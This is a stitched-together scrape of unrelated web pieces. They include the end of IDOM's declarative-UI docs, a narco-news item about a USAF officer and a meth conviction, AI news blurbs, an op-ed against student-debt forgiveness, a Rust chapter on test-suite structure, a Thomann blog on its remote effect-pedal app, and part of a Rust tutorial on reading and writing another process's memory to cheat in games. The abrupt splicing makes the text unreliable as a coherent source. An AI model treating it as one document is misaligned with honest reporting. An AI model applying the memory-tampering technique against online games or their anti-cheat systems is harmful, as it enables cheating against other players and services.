<code>state</code> from <code>False</code> to <code>True</code>, and a re-render of the component is scheduled. When
re-rendering, the function is again called, this time though, where <code>input_1</code> and
<code>input_2</code> have been updated to reflect the new <code>state</code>, thus causing the displayed text
to change.</p>
<p>In the code above, consider the fact that it never explicitely describes how to evolve
the frontend view when events occur. Instead, it declares that, given a particular
state, this is how the view should look. It's then IDOM's responsibility to figure out
how to bring that declaration into being. This behavior of defining outcomes without
stating the means by which to achieve them is what makes components in IDOM and React
"declarative". For comparison, a hypothetical, and a more imperative approach to
defining the same interface might look similar to the following:</p>

<p>In this imperative incarnation there are several disadvantages:</p>
<ol>
<li>
<p><strong>Refactoring is difficult</strong> - Functions are much more specialized to their
   particular usages in <code>make_and_gate</code> and thus cannot be easily generalized. By
   comparison, <code>use_toggle</code> from the declarative implementation could be applicable to
   any scenario where boolean indicators are toggled on and off.</p>
</li>
<li>
<p><strong>No clear static relations</strong> - There is no one section of code through which to
   discern the basic structure and behaviors of the view. This issue is exemplified by
   the fact that we must call <code>update_output_text</code> from two different locations. Once in
   the body of <code>make_and_gate</code> and again in the body of the callback <code>toggle_input</code>.
   This means that, to understand what the <code>output_text</code> might contain, we must also
   understand all the business logic that surrounds it.</p>
</li>
<li>
<p><strong>Referential links cause complexity</strong> - To evolve the view, various callbacks must
   hold references to all the elements that they will update. At the outset this makes
   writing programs difficult since elements must be passed up and down the call stack
   wherever they are needed. Considered further though, it also means that a function
   layers down in the call stack can accidentally or intentionally impact the behavior
   of ostensibly unrelated parts of the program.</p>
</li>
</ol>
<h2 id="virtual-document-object-model">Virtual Document Object Model</h2>
<p>To communicate between their back-end Python servers and Javascript clients, IDOM's
peers take an approach that aligns fairly closely with the
<a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller" target="_blank">Model-View-Controller</a>
design pattern - the controller lives server-side (though not always), the model is
what's synchronized between the server and client, and the view is run client-side in</p></article></div></div></main></div></div>

Tim Tennant, United States Air Force, is listed as the Director of Operations for the USAF's Combat Controller School at Pope AFB, which is part of the Fort Bragg military complex near Fayetteville, NC. The USAF Combat Controllers (CCT) are an elite SOF unit that specialize in airborne warfare.

The CCT mission is to deploy undetected into combat and hostile environments to establish assault zones or airfields, while simultaneously conducting air traffic control, fire support, command and control, direct action, counter-terrorism, foreign internal defense, humanitarian assistance and special reconnaissance.</blockquote><figure><div><div><p><img src="https://publish.narco.news/content/images/2021/02/Screen-Shot-2021-02-19-at-1.07.40-PM-2.png" width="1008" height="1302"></p></div></div><figcaption><em><a href="https://www.socom.mil/TipOfTheSpear/June%202004%20Tip%20of%20the%20Spear.pdf">U.S. SOCOM</a></em></figcaption></figure><p>In August of 2019, Tim Thacker of Raeford, NC was sentenced to 40 years for his role in a large-scale, multi-state <a href="https://www.justice.gov/usao-ednc/pr/hoke-county-man-sentenced-forty-years-drug-distribution">methamphetamine distribution</a> conspiracy going back over a decade, which he ran out of the municipal airport, P K Airpark-5w4, owned by the Thacker family, the same airport implicated in a massive cocaine trafficking conspiracy in 1984.

		<p><strong>New Algorithm Provides 50 Times Faster Deep Learning<br>
</strong>Using algorithms derived from neuroscience, based on a principle of the brain called sparsity, A.I. research company Numenta has achieved a dramatic performance improvement in deep learning networks, without any loss in accuracy. Their breakthrough is also vastly more energy efficient. Have a read <a href="https://www.futuretimeline.net/blog/2020/11/12-deep-learning-future-timeline-algorithm.htm">here</a>!</p>
<p><strong>A.I. is Wrestling With a Replication Crisis<br>
</strong>Science is built on a bedrock of trust, which typically involves sharing enough details about how research is carried out to enable others to replicate it, verifying results for themselves. This is how science self-corrects and weeds out results that don’t stand up. Replication also allows others to build on those results, helping to advance the field. Science that can’t be replicated usually falls by the wayside, but this seems to be a growing trend in A.I. research and growing numbers of scientists are pushing back against a perceived lack of transparency. Read more about this issue <a href="https://www.technologyreview.com/2020/11/12/1011944/artificial-intelligence-replication-crisis-science-big-tech-google-deepmind-facebook-openai/">here</a>.</p>
<p><strong>World’s First Production Car With ‘Eyes-Off’ Self-Driving Tech<br>
</strong>Honda has received regulatory approval from the Japanese Ministry of Land, Infrastructure, Transport, and Tourism (MLIT) to begin selling vehicles equipped with Level 3 autonomous driving. In a press release, Honda shared that it would begin the sale of the Honda Legend equipped with its all-new “Traffic Jam Pilot” feature by the end of the company’s fiscal year (March 31, 2021). Would you give it a try? Read more <a href="https://www.thedrive.com/tech/37568/honda-launching-worlds-first-production-car-with-eyes-off-self-driving-tech-by-mid-2021">here</a>.</p>

After all, roughly 42 million Americans have student loans amounting to a staggering <a href="https://www.brookings.edu/policy2020/votervital/who-owes-all-that-student-debt-and-whod-benefit-if-it-were-forgiven/">$1.5 trillion dollars</a>—it’s a larger share of household debt than credit cards. </p><p>Such debt relief would help underprivileged minorities, says Senate Majority Leader Chuck Schumer (D-NY). “During a time of historic and overlapping crises, which are disproportionately impacting communities of color, we must do everything in our power to deliver real relief to the American people, lift up our struggling economy, and close the racial wealth gap,” he stated in support of the cancellation, which would cost the government around $1 trillion.</p><p>But this argument gets it exactly <a href="https://www.wsj.com/articles/canceling-student-debt-would-be-a-brahmin-bailout-11606687827">backward</a>. Large-scale student-debt cancellation would disproportionately benefit the wealthy and make an imperceptible difference on the racial wealth gap—or even make it worse.</p><p>Although more people are going to college, they are still on average better off than the non-college educated. In 2019, Adam Looney of the Brookings Institution found that presidential candidate Elizabeth Warren’s proposal to forgive up to $50,000 of debt for households who earn less than a quarter-million dollars a year <a href="https://www.brookings.edu/blog/up-front/2019/04/24/how-progressive-is-senator-elizabeth-warrens-loan-forgiveness-proposal/">would be regressive</a>, with the bottom 60% of households receiving only 34% of the benefit. </p><p>What of Schumer’s claim that it would stimulate the economy? </p><p>Good stimulus measures immediately put extra cash in people’s hands. Forgiving student debt wouldn’t achieve this. The Trump administration <a href="https://studentaid.gov/announcements-events/coronavirus">already suspended payments</a> during the pandemic, and Jason Furman, former chairman of President Obama’s Council of Economic Advisers, <a href="https://twitter.com/jasonfurman/status/1328193936364539909">estimates that</a> debt forgiveness “likely has a multiplier close to zero.”</p><p>What about the racial wealth gap? Many advocates of student-debt forgiveness point to <a href="https://www.forbes.com/sites/korihale/2020/12/08/biden-cancelling-student-loans-could-close-the-racial-wealth-gap/?sh=5db0ec936cb6">uneven rates of borrowing</a> between young black and white adults, with the former often taking more debt than the latter. </p><p>The Duke University economist William A. Darity Jr., a <a href="https://twitter.com/SandyDarity/status/1334089836916043776">supporter</a> of student-debt forgiveness, examined this question in a <a href="https://socialequity.duke.edu/wp-content/uploads/2019/10/Running-the-Numbers-8.4.19-FINAL.pdf">2019 paper</a> that included analyses of the proposal by Warren and another by Bernie Sanders, who wanted to eliminate all student debt. “On the face of it, this would be a universal program that would disproportionately benefit black students because they hold a larger average amount of debt,” Darity wrote. But we also have to weigh this fact against the “enrollment rates for each group, because those who do not enroll in college or university do not acquire student loan debt.” Once you take this into account, by simply wiping out student debt, the “effect on the mean gap” between black and white wealth would be “imperceptible.” </p><p>A <a href="https://www.demos.org/research/less-debt-more-equity-lowering-student-debt-while-closing-black-white-wealth-gap">2015 analysis</a> by the think tank Demos was even more pessimistic about the impact of untargeted debt forgiveness. “While eliminating student debt for all households regardless of income increases median net worth for young white and Black households, white families see a greater benefit likely due to a higher likelihood of completing college and graduate degree programs,” it said. “Policies which eliminate all student debt for young households would expand the divide between median Black and white wealth by an additional 9%.” </p><p>So why are leading Democrats entranced by the proposal?</p><p><strong>One way to look at politics is through the lens of class interests.</strong> The Democratic Party is increasingly <a href="http://piketty.pse.ens.fr/files/Piketty2018.pdf">the party of college graduates</a>. In states such as Georgia, well-educated suburban whites formed the backbone of swing voters whom the party has relied on to make gains. A student-debt bailout is essentially representing their class interests, even if it’s far from an ideal policy to help the underprivileged. </p><p>None of this is to argue that we should do nothing about student debt. It is a growing problem worth addressing, and there are proposals on the <a href="https://www.brookings.edu/research/end-government-profits-on-student-loans-shift-risk-and-lower-interest-rates/">left</a> and <a href="https://www.hawley.senate.gov/sen-hawley-break-higher-education-monopoly-provide-more-options-career-training">right</a> worth considering, ranging from lowering interest rates to holding colleges themselves accountable for the amount of debt their students accrue. </p><p>For his part, Biden has asked Congress to send him a bill to <a href="https://www.cnbc.com/2021/01/08/student-loan-forgiveness-could-be-more-likely-but-challenges-remain-.html">forgive $10,000 of student debt</a> per borrower. While simply writing off a $50,000 debt would be a giveaway to an awful lot of well-paid doctors and lawyers, forgiving up to $10,000 of debt could be welcome relief for students who attended college but dropped out—the average person in this category has <a href="https://www.usnews.com/news/data-mine/articles/2017-11-07/federal-data-show-39-million-students-dropped-out-of-college-with-debt-in-2015-and-2016">less than $10,000 of debt</a> without getting the earning benefits of a college degree.</p><p>But if we really want to achieve the goals Schumer espouses, we should talk about aiding the least among us. As Matt Bruenig of the People’s Policy Project <a href="https://www.peoplespolicyproject.org/2017/09/12/who-was-in-poverty-in-2016/">has shown</a>, poverty in America is heavily concentrated among the children, elderly and disabled. These people would not directly benefit from a student-debt bailout—but there is a promising proposal that could do a lot to help them.</p><p>The Utah Republican, Senator Mitt Romney, is proposing the <a href="https://www.romney.senate.gov/romney-offers-path-provide-greater-financial-security-american-families">Family Security Act</a>, to create a monthly cash benefit for families, with $350 per child up to age 5, and $250 for each child between ages 6 and 17. The Niskanen Center estimates that Romney’s legislation would cut child poverty by <a href="https://www.niskanencenter.org/factsheet-senator-romneys-family-security-act/">around a third</a>, which would not only immediately benefit poor families but would have cascading effects on the prospects of their children. It would also please fiscal conservatives because Romney’s proposal is deficit-neutral, consolidating federal programs while ending the State and Local Tax deduction, <a href="https://www.cbpp.org/research/federal-tax/repealing-salt-cap-would-be-regressive-and-proposed-offset-would-use-up-needed">which is a regressive deduction</a>.</p><p>We live in a rich country, but one with a substantial number of people who aren’t sharing in that wealth. We could choose, like Schumer, to spend $1 trillion that would end up benefiting many who are already financially stable, healthy and upwardly mobile. Or we could focus our resources on those who are not sharing in the great promise of America. The choice is obvious.</p><p><strong>Zaid Jilani is a journalist based in Arlington, Virginia.

<p>We have used a test-driven approach to write all new pieces of functionality throughout the book.<br>
While this strategy has served us well, we have not invested a lot of time into <em>refactoring</em> our test code. As a result, our <code>tests</code> folder is a bit of mess at this point.<br>
Before moving forward, we will restructure our integration test suite to support us as our application grows in complexity and the number of tests increases.</p>

</ol>

<p>Is writing tests a good use of developers' time?</p>
<p>A good test suite is, first and foremost, a risk-mitigation measure.<br>
Automated tests reduce the risk associated with changes to an existing codebase - most regressions and bugs are caught in the continuous integration pipeline and never reach users. The team is therefore empowered to iterate faster and release more often.</p>
<p>Tests act as documentation as well.<br>
The test suite is often the best starting point when deep-diving in an unknown code base - it shows you how the code is supposed to behave and what scenarios are considered relevant enough to have dedicated tests for.</p>
<p>"Write a test suite!" should definitely be on your to-do list if you want to make your project more welcoming to new contributors.</p>
<p>There are other positive side-effects often associated with good tests - modularity, decoupling. These are harder to quantify, as we have yet to agree as an industry on what "good code" looks like.</p>

<p>Although there are compelling reasons to invest time and effort in writing a good test suite, reality is somewhat messier.</p>
<p>First, the development community did not always believe in the value of testing.<br>
We can find examples of test-driven development throughout the history of the discipline, but it is only with the "Extreme Programming" (XP) book that the practice entered the mainstream debate - in 1999!</p>
<p>Paradigm shifts do not happen overnight - it took years for the test-driven approach to gain traction as a "best practice" within the industry.</p>
<p>If test-driven development has won the minds and hearts of developers, the battle with management is often still undergoing.<br>
Good tests build technical leverage, but writing tests takes time. When a deadline is pressing, testing is often the first to be sacrificed.</p>
<p>As a consequence, most of the material you find around is either an introduction to testing or a guide on how to pitch its value to stakeholders.<br>
There is very little about testing <em>at scale</em> - what happens if you stick to the book and keep writing tests as the codebase grows to tens of thousands of lines, with hundreds of test cases?</p>

<p>All test suites start in the same way: an empty file, a world of possibilities.<br>
You go in, you add the first test. Easy, done.<br>
Then the second. Boom.<br>
The third. You just had to copy a few lines from the first, all good.<br>
The fourth...</p>
<p>After a while, test coverage starts to go down: new code is less thoroughly tested than the code you wrote at the very beginning of the project. Have you started to doubt the value of tests?<br>
Absolutely not, tests are great!<br>
Yet, you are writing fewer tests as the project moves forward.<br>
It's because of friction - it got progressively more cumbersome to write new tests as the codebase evolved.</p>
<blockquote>
<p>Test code is still code.</p>
</blockquote>
<p>It has to be modular, well-structured, sufficiently documented. It requires maintenance.<br>
If we do not actively invest in the health of our test suite, it will rot over time.<br>
Coverage goes down and soon enough we will find critical paths in our application code that are never exercised by automated tests.</p>
<p>You need to regularly step back to take a look at your test suite <em>as a whole</em>.<br>
Time to look at ours, isn't it?</p>

<p>All our integration tests live within a single file, <code>tests/health_check.rs</code>:</p>
<pre><code><span>//! tests/health_check.rs

</span></code></pre>
<p>There is only one test dealing with our health check endpoint - <code>health_check_works</code>.<br>
The other three tests are probing our <code>POST /subscriptions</code> endpoint while the rest of the code deals with shared setup steps (<code>spawn_app</code>, <code>TestApp</code>, <code>configure_database</code>, <code>TRACING</code>).</p>
<p>Why have we shoved everything in <code>tests/health_check.rs</code>?<br>
Because it was convenient!<br>
The setup functions were already there - it was easier to add another test case within the same file than figuring out how to share that code properly across multiple test modules.</p>
<p>Our main goal in this refactoring is <em>discoverability</em>: </p>
<ul>
<li>given an application endpoint, it should be easy to find the corresponding integration tests within the <code>tests</code> folder;</li>
<li>when writing a test, it should be easy to find the relevant test helper functions.</li>
</ul>
<p>We will focus on folder structure, but that  is definitely not the only tool available when it comes to test discovery.<br>
Test coverage tools can often tell you which tests triggered the execution of a certain line of application code.<br>
You can rely on techniques such as <a href="https://ferrous-systems.com/blog/coverage-marks/">coverage marks</a> to create an obvious link between test and application code.</p>
<p>As always, a multi-pronged approach is likely to give you the best results as the complexity of your test suite increases.</p>

<p>Before we start moving things around, let's nail down a few facts about integration testing in Rust.<br>
The <code>tests</code> folder is somewhat special - <code>cargo</code> knows to look into it searching for integration tests.</p>
<p>Each file within the <code>tests</code> folder gets compiled as its own crate.<br>
We can check this out by running <code>cargo build --tests</code> and then looking under <code>target/debug/deps</code>:</p>
<pre><code><span># Build test code, without running tests 
</span><span>cargo</span><span> build</span><span> --tests
</span><span># Find all files with a name starting with `health_check` 
</span><span>ls</span><span> target/debug/deps | </span><span>grep</span><span> health_check
</span></code></pre><pre><code><span>health_check-fc23645bf877da35
health_check-fc23645bf877da35.d
</span></code></pre>
<p>The trailing hashes will likely be different on your machine, but there should be two entries starting with <code>health_check-*</code>.<br>
What happens if you try to run it? </p>
<pre><code><span>./target/debug/deps/health_check-fc23645bf877da35
</span></code></pre><pre><code><span>running</span><span> 4 tests
</span><span>test</span><span> health_check_works ... ok
</span><span>test</span><span> subscribe_returns_a_400_when_fields_are_present_but_invalid ... ok
</span><span>test</span><span> subscribe_returns_a_400_when_data_is_missing ... ok
</span><span>test</span><span> subscribe_returns_a_200_for_valid_form_data ... ok

</span><span>test</span><span> result: ok. 4 passed; </span><span>finished</span><span> in 0.44s
</span></code></pre>
<p>That's right, it runs our integration tests!<br>
If we had five <code>*.rs</code> files under <code>tests</code>, we'd find five executables in <code>target/debug/deps</code>.</p>

<p>If each integration test file is its own executable, how do we share test helpers functions?</p>
<p>The first option is to define a stand-alone module - e.g. <code>tests/helpers/mod.rs</code><sup><a href="#test-common-folder">1</a></sup>.<br>
You can add common functions in <code>mod.rs</code> (or define other sub-modules in there) and then refer to <code>helpers</code> in your test file (e.g. <code>tests/health_check.rs</code>) with:</p>
<pre><code><span>//! tests/health_check.rs
// [...]
</span><span>mod </span><span>helpers;

</span><span>// [...]
</span></code></pre>
<p><code>helpers</code> is bundled in the <code>health_check</code> test executable as a sub-module and we get access to the functions it exposes in our test cases.<br>
This approach works fairly well to start out, but it leads to annoying <code>function is never used</code> warnings down the line.<br>
The issue is that <code>helpers</code> is bundled as a sub-module, it is not invoked as a third-party crate: <code>cargo</code> compiles each test executable in isolation and warns us if, for a specific test file, one or more public functions in <code>helpers</code> have never been invoked. This is bound to happen as your test suite grows - not all test files will use <em>all</em> your helper methods.</p>
<p>The second option takes full advantage of that each file under <code>tests</code> is its own executable - we can create sub-modules <em>scoped to a single test executable</em>!<br>
Let's create an <code>api</code> folder under <code>tests</code>, with a single <code>main.rs</code> file inside:</p>
<pre><code><span>tests/
  api/
    main.rs
  health_check.rs
</span></code></pre>
<p>First, we gain clarity: we are structuring <code>api</code> in the very same way we would structure a binary crate. Less magic - it builds on the same knowledge of the module system you built while working on application code.<br>
If you run <code>cargo build --tests</code> you should be able to spot</p>
<pre><code><span>Running</span><span> target/debug/deps/api-0a1bfb817843fdcf

</span><span>running</span><span> 0 tests

</span><span>test</span><span> result: ok. 0 passed; </span><span>finished</span><span> in 0.00s
</span></code></pre>
<p>in the output - <code>cargo</code> compiled <code>api</code> as a test executable, looking for tests cases.<br>
There is no need to define a <code>main</code> function in <code>main.rs</code> - the Rust test framework adds one for us behind the scenes<sup><a href="#custom-test-framework">2</a></sup>.</p>
<p>We can now add sub-modules in <code>main.rs</code>:</p>
<pre><code><span>//! tests/api/main.rs

</span><span>mod </span><span>helpers;
</span><span>mod </span><span>health_check;
</span><span>mod </span><span>subscriptions;
</span></code></pre>
<p>Add three empty files - <code>tests/api/helpers.rs</code>, <code>tests/api/health_check.rs</code> and <code>tests/api/subscriptions.rs</code>.<br>
Time to delete <code>tests/health_check.rs</code> and re-distribute its content:</p>
<pre><code><span>//! tests/api/helpers.rs
</span><span>use </span><span>sqlx::{Connection, Executor, PgConnection, PgPool};
</span><span>use </span><span>std::net::TcpListener;
</span><span>use </span><span>uuid::Uuid;
</span><span>use </span><span>zero2prod::configuration::{get_configuration, DatabaseSettings};
</span><span>use </span><span>zero2prod::e…</span></code></pre></article></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>The idea</h3><p><strong>Stompenberg.</strong> Sounds like a brand of Swedish outdoor clothing, but also like a villain in the next James Bond film – but in this case it’s actually a mash-up of two things. Stompenberg is the hybrid of <strong>“stomp boxes”</strong> and <strong>“Heisenberg”,</strong> which made the impossible possible after a long time of <strong>screwing</strong> and <strong>soldering.</strong>&nbsp;It’s a Thomann <strong>online app</strong> that allows musicians to<strong> test out real effect pedals</strong> with their own equipment, either <strong>from home</strong> or <strong>on the go</strong>. Below you will get a brief idea of the concept, development and implementation and of what <strong>Stompenberg</strong>&nbsp;is capable of… 💥🎶</p><hr><h3>Growing pains</h3><h4><strong>Planning&nbsp;</strong></h4><p>The <a href="https://www.thomann.de/gb/stompenberg_devices.html" target="_blank" rel="noopener noreferrer"><strong>selected pedals</strong></a> travel to the<strong> Thomann partner laboratory</strong> in <strong>Erlangen, Germany</strong> where they undergo some <strong>operations</strong> and <b>transformations&nbsp;</b>by our men in white with the <strong>license to solder.</strong></p><p>The following happens: A pedal is first deprived of its <strong>shell</strong>, <strong>pots</strong> and <strong>switches.</strong> The pots are measured to see what they do (whether they are <strong>linear, logarithmic,</strong> etc.) and replaced with <strong>digital pots</strong> and <strong>switches.</strong></p><p>Then, for reasons of shielding, the original <strong>housing</strong> is put back on. Everything is recognisable as a pedal again, but now, instead of pots and switches, <strong>ribbon cables</strong> hang from the orphaned holes.</p><h4><strong>The construction</strong></h4><p>This ever-growing Frankenstein is mounted on a <strong>rack drawer,</strong> which houses not only the <strong>power supply</strong> but also a <strong>mini-computer</strong> specially developed for this purpose, per pedal.</p><p><strong>Ribbon cable</strong> runs to the computer, audio cable into the pedal, everything is beautifully adjusted and balanced and then off to the rack!</p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/1-1-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/2-1-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/4-300x200.jpg"></p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/3-1-300x200.jpg"></p><hr><h3>Connection to the shop</h3><h4><strong>The longest guitar cable in the world…</strong></h4><p>… is available from <strong>Thomann</strong> in the <strong>shop,</strong> but not from <strong><a href="https://www.thomann.de/gb/stompenberg_devices.html">Stompenberg</a>.</strong> From now on the <strong>soldering iron</strong> gets put away and is replaced by a <strong>PC</strong> and <strong>keyboard</strong> in Thomann’s Treppendorf. This is where our <strong>developers</strong> and <strong>designers</strong> sit, brooding over the visualization of the pedals and the interface that allows the pedals to be operated from anywhere in the world. From the logo to the controls to each button, everything comes from Thomann’s teamwork.</p><p>When you turn the <strong>virtual knob</strong> at home, the <strong>digital knob</strong> on the pedal in the Thomann lab is adjusted via this interface, while your sound runs through exactly this pedal and comes back to you with effect. There are<strong> 3</strong> <strong>modes</strong> and a lot of <strong>UI tricks</strong> to discover.</p><p><img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/lava-150x150.jpg" width="275">&nbsp; <img src="https://www.thomann.de/blog/wp-content/uploads/2018/12/6-1024x682.jpg" width="412"></p><hr><h2><strong>The Interface</strong></h2><h4><strong>The effect device</strong></h4><p>Design and development flow together here with loving attention to detail: Every <strong>knob</strong> can be rotated, every <strong>footswitch</strong> can be stepped on and every <strong>lever</strong> is slidable. This replica <strong>behaves exactly like the real pedal</strong> in the lab, right down to the smallest <strong>LED,</strong> and can therefore be operated in exactly the same way.</p><h4><strong>The three modes: PLAY, REC &amp; LIVE</strong></h4><p><strong>PLAY:</strong> You feed <strong>pre-recorded samples</strong> or specially <strong>uploaded sounds</strong> through the pedals and operate the controls with <strong>both hands</strong> (if using a <strong>touchscreen)</strong> while the sound loops through the effect pedal.</p><p><strong>REC:</strong> If you want to go a step beyond, you can <strong>record your own riffs</strong> and loop them through the pedal of your choice!</p><p><strong>LIVE:</strong> The ultimate experience – here you <strong>play live</strong> and get the result back directly from the Thomann lab. So you can try out the pedal, live, from the comfort of your bedroom, with just a small <strong>latency,</strong> but that’s not bad considering the signal travels virtually at the speed of light&nbsp;through the<strong> whole of Germany or even the whole of Europe.&nbsp;</strong></p><p>The bright side: Even if your pedal is busy and you end up in the waiting queue, you don’t have to listen to the dude in front of you butchering a cover of Stairway To Heaven 😉</p><h4><strong>And the rest of my equipment?</strong></h4><p>If you want to know exactly how the distortion in front of your own amp is done, you might need a <strong>reamping box.</strong> But under certain circumstances the line output of the interface does the trick too, just turned down low. The result reads like a poem:</p><p>You play your own guitar</p><p>through a real pedal (which is somewhere else)</p><p>through your amp</p><p>through your cabinet or speakers</p><p>at the volume you want</p><p>and you can turn, shift and control all the knobs as you like.</p><p>… and get a pretty accurate picture if this pedal will be your new one or if you prefer another one (which you tested with Stompenberg). No need to drive to Treppendorf, to send cardboard boxes back to Thomann halfway around the world, or to listen to annoying comments from the people waiting in line.</p><p><img loading="lazy" src="https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1.jpg" alt="" width="1400" height="626" srcset="https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1.jpg 1400w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-565x253.jpg 565w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-300x134.jpg 300w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-768x343.jpg 768w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-1024x458.jpg 1024w, https://www.thomann.de/blog/wp-content/uploads/2018/12/8-1-215x96.jpg 215w" sizes="(max-width: 1400px) 100vw, 1400px"></p><hr><h3><strong>The Future</strong></h3><p>The conversion is in full swing and while <strong>Stompenberg</strong> is running, our partners in <strong>Erlangen</strong> are taking more pedals apart every day to make them digitally accessible.

With the pid now in our hands, we can do pretty much anything to its corresponding process.</p><p>It's now time to read the process' memory and write to it. If our process was a single-player game, this would enable us to do things like setting a very high value on the player's current health pool, making us invincible. This technique will often not work for multi-player games, because the server likely knows your true current health (the most you could probably do is make the client render an incorrect value). However, if the server is crappy and it trusts the client, then you're still free to mess around with your current health.</p><p>Even if we don't want to write to the process' memory, reading is still very useful. Maybe you could enhance your experience by making a custom overlay that displays useful information, or something that makes noise if it detects the life is too low, or even simulating a keyboard event to automatically recover some mana when you're running low.</p><p>Be warned about anti-cheat systems. Anything beyond a basic game is likely to have some protection measures in place, making the analysis more difficult (perhaps the values are scrambled in memory), or even pinging the server if it detects something fishy.</p><p><strong>I am not responsible for any bans!</strong> Use your brain before messing with online games, and don't ruin the fun for everyone else. If you get caught for cheating, I don't want to know about it.</p><p>Now that all <a href="https://www.urbandictionary.com/define.php?term=script%20kiddie">script kiddies</a> have left the room, let's proceed with the post.</p><h2 id="exact-value-scanning">Exact Value scanning</h2><details open=""><summary>Cheat Engine Tutorial: Step 2</summary> <blockquote><p>Now that you have opened the tutorial with Cheat Engine let's get on with the next step.</p><p>You can see at the bottom of this window is the text Health: xxx. Each time you click 'Hit me' your health gets decreased.</p><p>To get to the next step you have to find this value and change it to 1000</p><p>To find the value there are different ways, but I'll tell you about the easiest, 'Exact Value': First make sure value type is set to at least 2-bytes or 4-bytes. 1-byte will also work, but you'll run into an easy to fix problem when you've found the address and want to change it. The 8-byte may perhaps works if the bytes after the address are 0, but I wouldn't take the bet. Single, double, and the other scans just don't work, because they store the value in a different way.</p><p>When the value type is set correctly, make sure the scantype is set to 'Exact Value'. Then fill in the number your health is in the value box. And click 'First Scan'. After a while (if you have a extremely slow pc) the scan is done and the results are shown in the list on the left</p><p>If you find more than 1 address and you don't know for sure which address it is, click 'Hit me', fill in the new health value into the value box, and click 'Next Scan'. Repeat this until you're sure you've found it. (that includes that there's only 1 address in the list.....)</p><p>Now double click the address in the list on the left. This makes the address pop-up in the list at the bottom, showing you the current value. Double click the value, (or select it and press enter), and change the value to 1000.</p><p>If everything went ok the next button should become enabled, and you're ready for the next step.</p><p>Note: If you did anything wrong while scanning, click "New Scan" and repeat the scanning again. Also, try playing around with the value and click 'hit me'</p></blockquote></details><h2 id="our-first-scan">Our First Scan</h2><p>The Cheat Engine tutorial talks about "value types" and "scan types" like "exact value".</p><p>The <strong>value types</strong> will help us narrow down <em>what</em> we're looking for. For example, the integer type <code>i32</code> is represented in memory as 32 bits, or 4 bytes. However, <code>f32</code> is <em>also</em> represented by 4 bytes, and so is <code>u32</code>. Or perhaps the 4 bytes represent RGBA values of a color! So any 4 bytes in memory can be interpreted in many ways, and it's up to us to decide which way we interpret the bytes in.</p><p>When programming, numbers which are 32-bit wide are common, as they're a good (and fast) size to work with. Scanning for this type is often a good bet. For positive numbers, <code>i32</code> is represented the same as <code>u32</code> in memory, so even if the value turns out to not be signed, the scan is likely to work. Focusing on <code>i32</code> will save us from scanning for <code>f32</code> or even other types, like interpreting 8 bytes for <code>i64</code>, <code>f64</code>, or less bytes like <code>i16</code>.</p><p>The <strong>scan types</strong> will help us narrow down <em>how</em> we're looking for a value. Scanning for an exact value means what you think it does: interpret all 4 bytes in the process' memory as our value type, and check if they exactly match our value. This will often yield a lot of candidates, but it will be enough to get us started. Variations of the exact scan include checking for all values below a threshold, above, in between, or even just… unknown.</p><p>What's the point of scanning for unknown values if <em>everything</em> in memory is unknown? Sometimes you don't have a concrete value. Maybe your health pool is a bar and it nevers tell you how much health you actually have, just a visual indicator of your percentage left, even if the health is not stored as a percentage. As we will find later on, scanning for unknown values is more useful than it might appear at first.</p><p>We can access the memory of our own program by guessing random pointers and trying to read from them. But Windows isolates the memory of each program, so no pointer we could ever guess will let us read from the memory of another process. Luckily for us, searching for "read process memory winapi" leads us to the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory"><code>ReadProcessMemory</code></a> function. Spot on.</p><pre><code data-lang="rust">pub fn read_memory(&amp;self, addr: usize, n: usize) -&gt; io::Result&lt;Vec&lt;u8&gt;&gt; {
    todo!()
}
</code></pre><p>Much like trying to dereference a pointer pointing to released memory or even null, reading from an arbitrary address can fail for the same reasons (and more). We will want to signal this with <code>io::Result</code>. It's funny to note that, even though we're doing something that seems wildly unsafe (reading arbitrary memory, even if the other process is mutating it at the same time), the function is perfectly safe. If we cannot read something, it will return <code>Err</code>, but if it succeeds, it has taken a snapshot of the memory of the process, and the returned value will be correctly initialized.</p><p>The function will be defined inside our <code>impl Process</code>, since it conveniently holds an open handle to the process in question. It takes <code>&amp;self</code>, because we do not need to mutate anything in the <code>Process</code> instance. After adding the <code>memoryapi</code> feature to <code>Cargo.toml</code>, we can perform the call:</p><pre><code data-lang="rust">let mut buffer = Vec::&lt;u8&gt;::with_capacity(n);
let mut read = 0;

// SAFETY: the buffer points to valid memory, and the buffer size is correctly set.
if unsafe {
    winapi::um::memoryapi::ReadProcessMemory(
        self.handle.as_ptr(),
        addr as *const _,
        buffer.as_mut_ptr().cast(),
        buffer.capacity(),
        &amp;mut read,
    )
} == FALSE
{
    Err(io::Error::last_os_error())
} else {
    // SAFETY: the call succeeded and `read` contains the amount of bytes written.
    unsafe { buffer.set_len(read as usize) };
    Ok(buffer)
}
</code></pre><p>Great! But the address space is somewhat large. 64 bits large. Eighteen quintillion, four hundred and forty-six quadrillion, seven hundred and forty-four trillion, seventy-three billion, seven hundred and nine million, five hundred and fifty-one thousand, six hundred and sixteen<sup><a href="#1">1</a></sup> large. You gave up reading that, didn't you? Anyway, 18'446'744'073'709'551'616 is a <em>big</em> number.</p><p>I am not willing to wait for the program to scan over so many values. I don't even have 16 <a href="https://en.wikipedia.org/wiki/Orders_of_magnitude_(data)">exbibytes</a> of RAM installed on my laptop yet<sup><a href="#2">2</a></sup>! What's up with that?</p><h2 id="memory-regions">Memory regions</h2><p>The program does not actually have all that memory allocated (surprise!). Random-guessing an address is extremely likely to point out to invalid memory. Reading from the start of the address space all the way to the end would not be any better. And we <strong>need</strong> to do better.</p><p>We need to query for the memory regions allocated to the program. For this purpose we can use <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex"><code>VirtualQueryEx</code></a>.</p><blockquote><p>Retrieves information about a range of pages within the 